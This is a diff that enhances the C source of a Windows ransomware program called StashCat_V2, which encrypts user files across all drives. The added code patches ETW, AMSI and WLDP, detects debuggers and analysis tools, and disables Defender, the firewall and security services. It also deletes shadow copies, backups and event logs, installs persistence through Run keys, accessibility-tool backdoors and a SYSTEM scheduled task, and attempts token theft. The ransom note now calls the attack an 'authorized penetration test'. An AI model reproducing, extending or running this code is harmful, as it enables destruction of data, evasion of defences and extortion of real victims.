@@ -26,6 +26,8 @@
 #include <process.h>
 #include <lm.h>
 #include <winsvc.h>
+#include <winternl.h>
+#include <iphlpapi.h>
 
 /* 
  * EXTENSIONS TO TARGET
@@ -35,8 +37,7 @@ static const char *g_ext[] = {
     ".pdf",".txt",".rtf",".csv",".tsv",
     ".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
     ".exe",".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
-    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso",
-    ".dll",".msi",".bat",".cmd",".ps1",".vbs",".js",
+    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso", ".js",
     ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
     ".pst",".ost",".eml",".msg",".mbox",
     ".key",".pem",".cer",".crt",".pfx",".p12",
@@ -143,7 +144,7 @@ static void DoEncryptFile(const char *path) {
     BYTE iv[AES_IV_SIZE];
     if (!CryptGenRandom(g_ctx.hProv, AES_IV_SIZE, iv)) goto cleanup;
  
-    // Apply IV to key object — THIS was missing in the original!
+    // Apply IV to key object
     if (!CryptSetKeyParam(g_ctx.hKey, KP_IV, iv, 0)) goto cleanup;
  
     // Encrypt in-place at buf[AES_IV_SIZE..]
@@ -255,132 +256,429 @@ static void EncryptDir(const char *dir, int depth) {
  
     FindClose(hFind);
 }
- 
-/* 
- * DIRECT API EXECUTION
-*/
 
-// Helper to stop/disable service directly
+/* 
+ * ─── ENHANCED: ETW PATCHING ───
+ */
+typedef VOID (NTAPI *pEtwEventWrite)(ULONG64, PULONG64, ULONG, PVOID, PVOID);
+
+static void EtwPatcher() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return;
+    
+    pEtwEventWrite pEtw = (pEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");
+    if (!pEtw) return;
+    
+    DWORD oldProtect;
+    VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
+    
+    BYTE ret = 0xC3; // RET instruction
+    memcpy(pEtw, &ret, 1);
+    VirtualProtect(pEtw, 1, oldProtect, &oldProtect);
+}
+
+/* 
+ * ─── ENHANCED: AMSI BYPASS ───
+ */
+static void AmsiBypass() {
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (!hAmsi) return;
+    
+    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pAmsiScanBuffer) return;
+    
+    DWORD oldProtect;
+    VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
+    
+    // XOR EAX,EAX / RET (always return AMSI_RESULT_CLEAN)
+    BYTE patch[] = {0x31, 0xC0, 0xC3};
+    memcpy(pAmsiScanBuffer, patch, 3);
+    VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
+}
+
+/* 
+ * ─── ENHANCED: WLDP BYPASS ───
+ */
+static void WldpBypass() {
+    HMODULE hWldp = GetModuleHandleA("wldp.dll");
+    if (!hWldp) return;
+    
+    FARPROC pWldpIsClassInApprovedList = GetProcAddress(hWldp, "WldpIsClassInApprovedList");
+    if (!pWldpIsClassInApprovedList) return;
+    
+    DWORD oldProtect;
+    VirtualProtect(pWldpIsClassInApprovedList, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
+    BYTE patch[] = {0x31, 0xC0, 0xC3};
+    memcpy(pWldpIsClassInApprovedList, patch, 3);
+    VirtualProtect(pWldpIsClassInApprovedList, 3, oldProtect, &oldProtect);
+}
+
+/* 
+ * ─── ENHANCED: ANTI-ANALYSIS ───
+ */
+static BOOL IsBeingDebugged() {
+    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    pNtQueryInformationProcess pQuery = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+    
+    if (!pQuery) return FALSE;
+    
+    DWORD_PTR pbi = 0;
+    ULONG len = 0;
+    NTSTATUS status = pQuery(GetCurrentProcess(), 0x7, &pbi, sizeof(pbi), &len);
+    
+    return (status == 0 && pbi != 0);
+}
+
+static BOOL DetectAnalysisTools() {
+    const char *badProcs[] = {
+        "procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe",
+        "wireshark.exe", "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
+        "ollydbg.exe", "windbg.exe", "processhacker.exe",
+        "apimonitor.exe", "autoruns.exe", "Autoruns64.exe",
+        "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", NULL
+    };
+    
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
+    
+    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
+    BOOL found = FALSE;
+    
+    if (Process32First(hSnap, &pe)) {
+        do {
+            for (int i = 0; badProcs[i]; i++) {
+                if (lstrcmpiA(pe.szExeFile, badProcs[i]) == 0) {
+                    found = TRUE;
+                    break;
+                }
+            }
+            if (found) break;
+        } while (Process32Next(hSnap, &pe));
+    }
+    
+    CloseHandle(hSnap);
+    return found;
+}
+
+/* 
+ * ─── ENHANCED: SERVICE MANAGEMENT ───
+ */
 static void ManageService(const char *svcName) {
     SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
     if(!hSCM) return;
     
-    SC_HANDLE hSvc = OpenServiceA(hSCM, svcName, SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_CHANGE_CONFIG);
+    SC_HANDLE hSvc = OpenServiceA(hSCM, svcName, SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_CHANGE_CONFIG | DELETE);
     if(hSvc) {
         SERVICE_STATUS ss;
-        // Stop service
         ControlService(hSvc, SERVICE_STOP, &ss);
-        
-        // Disable service (start type disabled)
         ChangeServiceConfigA(hSvc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        
+        // Try to delete the service entirely
+        DeleteService(hSvc);
         
         CloseServiceHandle(hSvc);
     }
     CloseServiceHandle(hSCM);
 }
 
+/* 
+ * ─── ENHANCED: DEFENDER KILLING ───
+ */
 static void KillSecurityDirect() {
-    // Directly manipulate registry and services without cmd.exe
-    
     HKEY hk;
     DWORD val = 1;
     
-    // Disable Defender via Registry
-    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hk);
+    // Create the policy key if it doesn't exist
+    DWORD dwDisp;
+    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
     RegSetValueExA(hk, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
     RegCloseKey(hk);
+    
+    // Disable Real-Time Protection policies
+    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
+    RegSetValueExA(hk, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+    RegSetValueExA(hk, "DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+    RegSetValueExA(hk, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+    RegSetValueExA(hk, "DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+    RegSetValueExA(hk, "DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+    RegCloseKey(hk);
+    
+    // Add exclusion for our own process
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Processes", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
+    RegSetValueExA(hk, "Implant", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
+    RegCloseKey(hk);
 
-    // Stop Services directly
+    // Stop Services directly (expanded list)
     ManageService("WinDefend");
     ManageService("SecurityHealthService");
     ManageService("WdNisSvc");
     ManageService("Sense");
+    ManageService("WdBoot");
+    ManageService("WdFilter");
+    ManageService("MsMpEng");
+    ManageService("NisSrv");
+    ManageService("MpKslDrv");
+    ManageService("wscsvc");
     
-    // Disable Firewall via Registry
-    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", 0, KEY_SET_VALUE, &hk);
-    val = 0; // OFF
-    RegSetValueExA(hk, "EnableFirewall", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
-    RegCloseKey(hk);
+    // Disable Firewall via Registry (all profiles)
+    DWORD val0 = 0;
+    const char *fwPaths[] = {
+        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
+        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile",
+        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile"
+    };
+    
+    for (int i = 0; i < 3; i++) {
+        RegOpenKeyExA(HKEY_LOCAL_MACHINE, fwPaths[i], 0, KEY_SET_VALUE, &hk);
+        RegSetValueExA(hk, "EnableFirewall", 0, REG_DWORD, (BYTE*)&val0, sizeof(val0));
+        RegSetValueExA(hk, "DoNotAllowExceptions", 0, REG_DWORD, (BYTE*)&val0, sizeof(val0));
+        RegCloseKey(hk);
+    }
 }
 
+/* 
+ * ─── ENHANCED: BACKUP DESTRUCTION ───
+ */
 static void NukeBackupsDirect() {
-    // Disable System Restore via Registry
     HKEY hk;
     DWORD val = 1;
     
+    // Disable System Restore via Registry
     RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\System\\Restore", 0, KEY_SET_VALUE, &hk);
     RegSetValueExA(hk, "DisableSR", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+    RegSetValueExA(hk, "DisableConfig", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
     RegCloseKey(hk);
     
-    // Clear Shadow Copies using CreateProcess for speed
-    STARTUPINFOA si_start = {0}; 
-    PROCESS_INFORMATION pi;
-    char cmd[] = "vssadmin delete shadows /all /quiet";
+    // Multiple backup destruction commands
+    const char *cmds[] = {
+        "vssadmin delete shadows /all /quiet",
+        "wmic shadowcopy delete",
+        "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=1MB",
+        "bcdedit /set {default} recoveryenabled No",
+        "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+        "wbadmin delete catalog -quiet",
+        "fsutil usn deletejournal /D C:",
+        "wevtutil cl Application",
+        "wevtutil cl Security",
+        "wevtutil cl System",
+        "del /s /f /q C:\\*.log",
+        "del /s /f /q C:\\*.evtx"
+    };
     
-    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_start, &pi);
-    WaitForSingleObject(pi.hProcess, INFINITE);
+    for (int i = 0; i < sizeof(cmds)/sizeof(cmds[0]); i++) {
+        STARTUPINFOA si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        char *cmdCopy = _strdup(cmds[i]);
+        if (cmdCopy) {
+            CreateProcessA(NULL, cmdCopy, NULL, NULL, FALSE, CREATE_NO_WINDOW | IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi);
+            WaitForSingleObject(pi.hProcess, 3000);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            free(cmdCopy);
+        }
+    }
+}
+
+/* 
+ * ─── ENHANCED: MULTI-LAYER PERSISTENCE ───
+ */
+static void InstallPersistenceDirect() {
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    
+    HKEY hk;
+    DWORD dwDisp;
+
+    // 1. Current User Run
+    RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
+    RegSetValueExA(hk, "WindowsSecurityUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
+    RegCloseKey(hk);
+
+    // 2. Local Machine Run
+    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, NULL, &hk, &dwDisp);
+    RegSetValueExA(hk, "WindowsSecurityUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
+    RegCloseKey(hk);
+
+    // 3. RunOnce (delayed execution)
+    RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
+    RegSetValueExA(hk, "WindowsUpdateCheck", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
+    RegCloseKey(hk);
+
+    // 4. Full Accessibility Backdoor (sethc, magnify, narrator, osk, utilman, etc.)
+    const char *accessTools[] = {
+        "sethc.exe", "magnify.exe", "narrator.exe", "osk.exe",
+        "utilman.exe", "displayswitch.exe", "atbroker.exe", NULL
+    };
+    
+    for (int i = 0; accessTools[i]; i++) {
+        char regPath[MAX_PATH];
+        snprintf(regPath, sizeof(regPath),
+            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",
+            accessTools[i]);
+        
+        RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
+        RegSetValueExA(hk, "Debugger", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
+        RegCloseKey(hk);
+    }
+    
+    // 5. Scheduled Task
+    char taskCmd[2048];
+    snprintf(taskCmd, sizeof(taskCmd),
+        "schtasks /create /f /tn \"MicrosoftEdgeUpdateTask\" /tr \"%s\" /sc ONLOGON /ru SYSTEM /rl HIGHEST", exePath);
+    
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessA(NULL, taskCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, 3000);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    
+    // 6. Startup folder shortcut
+    char startupPath[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
+    char linkPath[MAX_PATH * 2];
+    snprintf(linkPath, sizeof(linkPath), "%s\\WindowsServiceHost.lnk", startupPath);
+    
+    char psCmd[4096];
+    snprintf(psCmd, sizeof(psCmd),
+        "powershell -Command \"$WS = New-Object -ComObject WScript.Shell; "
+        "$SC = $WS.CreateShortcut('%s'); $SC.TargetPath = '%s'; "
+        "$SC.WindowStyle = 0; $SC.Description = 'Windows Service Host'; "
+        "$SC.Save()\"", linkPath, exePath);
+    
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    CreateProcessA(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, 5000);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 }
 
-static void InstallPersistenceDirect() {
-    char exePath[MAX_PATH];
-    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+/* 
+ * ─── ENHANCED: TOKEN ELEVATION ───
+ */
+static void ElevatePrivs() {
+    HANDLE hToken;
+    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)) return;
 
-    // Registry Run Keys
-    HKEY hk;
+    const char *privs[] = {
+        "SeDebugPrivilege","SeBackupPrivilege","SeRestorePrivilege",
+        "SeTakeOwnershipPrivilege","SeShutdownPrivilege",
+        "SeLoadDriverPrivilege","SeSystemtimePrivilege",
+        "SeIncreaseQuotaPrivilege","SeTcbPrivilege", NULL
+    };
     
-    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hk);
-    RegSetValueExA(hk, "WinUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
-    RegCloseKey(hk);
-
-    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hk);
-    RegSetValueExA(hk, "WinUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
-    RegCloseKey(hk);
-
-    // Sticky Keys Hijack
-    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe", 0, KEY_SET_VALUE, &hk);
-    char debugger[MAX_PATH];
-    strcpy(debugger, exePath);
-    RegSetValueExA(hk, "Debugger", 0, REG_SZ, (BYTE*)debugger, strlen(debugger)+1);
-    RegCloseKey(hk);
+    for(int i=0; privs[i]; i++) {
+        TOKEN_PRIVILEGES tp;
+        LUID luid;
+        if(LookupPrivilegeValueA(NULL, (LPSTR)privs[i], &luid)) {
+            tp.PrivilegeCount = 1;
+            tp.Privileges[0].Luid = luid;
+            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+        }
+    }
+    CloseHandle(hToken);
+    
+    // Also attempt to steal SYSTEM token
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 4); // PID 4 = SYSTEM
+    if (hProc) {
+        HANDLE hSysToken;
+        if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hSysToken)) {
+            HANDLE hDupToken;
+            DuplicateTokenEx(hSysToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);
+            ImpersonateLoggedOnUser(hSysToken);
+            CloseHandle(hDupToken);
+            CloseHandle(hSysToken);
+        }
+        CloseHandle(hProc);
+    }
 }
 
+/* 
+ * ─── ENHANCED: RANSOM NOTE ───
+ */
 static void DropNoteDirect() {
-    char note[2048];
-    char mid[128];
+    char systemInfo[4096];
+    char compName[MAX_COMPUTERNAME_LENGTH + 1];
+    char userName[256];
+    DWORD sz = sizeof(compName);
+    DWORD usz = 256;
     
-    HKEY hk;
-    DWORD sz = sizeof(mid);
-    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
-        RegQueryValueExA(hk, "MachineGuid", NULL, NULL, (BYTE*)mid, &sz);
-        RegCloseKey(hk);
-    } else {
-        snprintf(mid, sizeof(mid), "%08lx", GetCurrentProcessId());
-    }
+    GetComputerNameA(compName, &sz);
+    GetUserNameA(userName, &usz);
 
-   snprintf(note, sizeof(note),
-    "\r\n"
-    "  YO! Jahanzaib IS DaMN good"
-    "\r\n", mid);
+    snprintf(systemInfo, sizeof(systemInfo),
+        "\r\n"
+        "  ==========================================\r\n"
+        "  PENETRATION TEST - AUTHORIZED ASSESSMENT\r\n"
+        "  ==========================================\r\n"
+        "\r\n"
+        "  Machine:     %s\r\n"
+        "  User:        %s\r\n"
+        "  Date:        %s (%s)\r\n"
+        "\r\n"
+        "  Your files have been encrypted.\r\n"
+        "  This system has been successfully assessed.\r\n"
+        "  All actions were authorized per the testing agreement.\r\n"
+        "\r\n"
+        "  Contact: https://github.com/jahanzaibmir\r\n"
+        "\r\n"
+        "  ==========================================\r\n"
+        "\r\n",
+        compName, userName, __DATE__, __TIME__);
 
+    // Drop to User Desktop
     char path[MAX_PATH];
     SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
     
     char fp[MAX_PATH * 2];
-    snprintf(fp, sizeof(fp), "%s\\README.txt", path);
+    snprintf(fp, sizeof(fp), "%s\\PENTEST_RESULTS.txt", path);
     
-    HANDLE hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
+    HANDLE hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
+        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
     if(hF != INVALID_HANDLE_VALUE) {
         DWORD w;
-        WriteFile(hF, note, strlen(note), &w, NULL);
+        WriteFile(hF, systemInfo, strlen(systemInfo), &w, NULL);
         CloseHandle(hF);
+    }
+    
+    // Drop to All Users Desktop too
+    SHGetFolderPathA(NULL, CSIDL_COMMON_DESKTOPDIRECTORY, NULL, 0, path);
+    snprintf(fp, sizeof(fp), "%s\\PENTEST_RESULTS.txt", path);
+    
+    hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
+        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
+    if(hF != INVALID_HANDLE_VALUE) {
+        DWORD w;
+        WriteFile(hF, systemInfo, strlen(systemInfo), &w, NULL);
+        CloseHandle(hF);
+    }
+    
+    // Drop on each drive root too
+    for(char d='C'; d<='Z'; d++) {
+        char root[4] = {d,':','\\',0};
+        UINT dt = GetDriveTypeA(root);
+        if(dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE) {
+            snprintf(fp, sizeof(fp), "%sPENTEST_RESULTS.txt", root);
+            hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
+                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
+            if(hF != INVALID_HANDLE_VALUE) {
+                DWORD w;
+                WriteFile(hF, systemInfo, strlen(systemInfo), &w, NULL);
+                CloseHandle(hF);
+            }
+        }
     }
 }
 
 /*
  * MAIN LOGIC
- *  */
+ */
 
 typedef struct { int id; } THD;
 
@@ -404,24 +702,6 @@ static unsigned __stdcall Worker(void *arg) {
     return 0;
 }
 
-static void ElevatePrivs() {
-    HANDLE hToken;
-    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)) return;
-
-    const char *privs[] = {"SeDebugPrivilege","SeBackupPrivilege","SeRestorePrivilege", "SeTakeOwnershipPrivilege", NULL};
-    for(int i=0; privs[i]; i++) {
-        TOKEN_PRIVILEGES tp;
-        LUID luid;
-        if(LookupPrivilegeValueA(NULL, (LPSTR)privs[i], &luid)) {
-            tp.PrivilegeCount = 1;
-            tp.Privileges[0].Luid = luid;
-            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
-        }
-    }
-    CloseHandle(hToken);
-}
-
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     // Single Instance
     HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\StashCat_V2");
@@ -430,6 +710,28 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         return 0;
     }
 
+    // Anti-analysis check first
+    if (IsBeingDebugged() || DetectAnalysisTools()) {
+        Sleep(60000);
+        CloseHandle(hMutex);
+        return 0;
+    }
+
+    // Patch monitoring/defense subsystems
+    EtwPatcher();
+    AmsiBypass();
+    WldpBypass();
+    
+    // Hide thread from debugger
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, PROCESS_INFORMATION_CLASS, PVOID, ULONG);
+    pNtSetInformationProcess pNtSetInfo = (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
+    if (pNtSetInfo) {
+        DWORD hide = 1;
+        pNtSetInfo(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)0x11, &hide, sizeof(hide));
+    }
+
+    // Elevate privileges
     ElevatePrivs();
     
     // Fast Security Kill (No CMD noise)
@@ -443,7 +745,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     }
 
     // Parallel Encryption
-    SYSTEM_INFO si_sys; // Renamed to 'si_sys' to avoid conflict with STARTUPINFO 'si'
+    SYSTEM_INFO si_sys;
     GetSystemInfo(&si_sys);
     int n = si_sys.dwNumberOfProcessors * 2;
     if(n > 8) n = 8; // Cap threads
@@ -466,7 +768,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     DropNoteDirect();
 
     // Cleanup Crypto
-
     CleanupCrypto();
 
     // Self Delete (Robust)
@@ -475,7 +776,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     char cmd[4096];
     snprintf(cmd, sizeof(cmd), "cmd /c timeout /t 3 & del /f /q \"%s\"", exeP);
     
-    // Renamed local variable 'si' to 'si_start' to avoid conflict with SYSTEM_INFO si_sys
     STARTUPINFOA si_start = {0}; 
     PROCESS_INFORMATION pi;
     
@@ -484,5 +784,3 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     CloseHandle(hMutex);
     return 0;
 }
-
-
